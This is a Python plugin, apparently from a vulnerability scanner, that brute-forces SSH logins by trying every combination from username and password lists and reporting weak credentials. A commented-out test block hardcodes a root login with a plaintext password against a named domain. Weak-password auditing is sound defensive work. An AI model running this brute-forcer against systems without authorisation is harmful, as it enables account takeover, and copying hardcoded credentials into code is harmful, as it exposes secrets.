# !/usr/bin/env python3
# @Time    : 2020/7/31
# @Author  : caicai
# @File    : __ssh_brute.py

import paramiko

#
# try:
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#     ssh.connect(hostname="www.evilhex.top", port=22, username="root", password="haha8989...",banner_timeout=30)
#
# except Exception as e:
#     print(str(e))

'''
此模块由于其特殊性，限定1线程
'''
from myscan.lib.hostscan.pocbase import PocBase
from myscan.lib.core.data import paths, cmd_line_options, logger
from myscan.lib.hostscan.common import get_data_from_file
from myscan.lib.core.common import get_random_str
from myscan.lib.core.threads import mythread
import os
from myscan.lib.patch.paramiko_patch import patch_banner_timeout


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详见 Class3-hostscan开发指南.md
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.addr = self.dictdata.get("addr")  # type:str
        self.port = self.dictdata.get("port")  # type:int
        # 以下根据实际情况填写
        self.name = "ssh_brute"
        self.vulmsg = "ssh weak pass"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.require = {
            "service": ["ssh"],  # nmap本身识别为ms-sql-s ,为了以后扩展自己识别脚本,多个mssql
            "type": "tcp"
        }
        # 自定义
        self.right_pwd = None

    def verify(self):
        if not self.check_rule(self.dictdata, self.require):  # 检查是否满足测试条件
            return
        pwdfile = os.path.join("brute", "ssh_pass")
        userfile = os.path.join("brute", "ssh_user")
        pwds = [""]
        pwds += get_data_from_file(os.path.join(paths.MYSCAN_DATA_PATH, pwdfile))
        users = get_data_from_file(os.path.join(paths.MYSCAN_DATA_PATH, userfile))
        userpass = []
        for user in users:
            for pwd in pwds:
                userpass.append((user, pwd))
        userpass_ = [("oracle", "oracle"), ("postgresql", "postgresql")]
        userpass += userpass_
        # patch_banner_timeout()
        if "Authentication failed" in self.crack_ssh((get_random_str(6).lower(), get_random_str(6).lower())):
            mythread(self.crack_ssh, userpass, 1)
            if self.right_pwd is not None:
                self.result.append({
                    "name": self.name,
                    "url": "tcp://{}:{}".format(self.addr, self.port),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "user/pwd": "/".join(self.right_pwd)
                    }
                })

    def crack_ssh(self, userpwd):
        user, pass_ = userpwd
        if self.right_pwd is None:
            logger.debug("test ssh_brute userpwd:{}".format(userpwd))
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=self.addr, port=self.port, username=user, password=pass_, banner_timeout=300)
                self.right_pwd = userpwd
                return "success"
            except Exception as e:
                print("fail")
                return str(e)

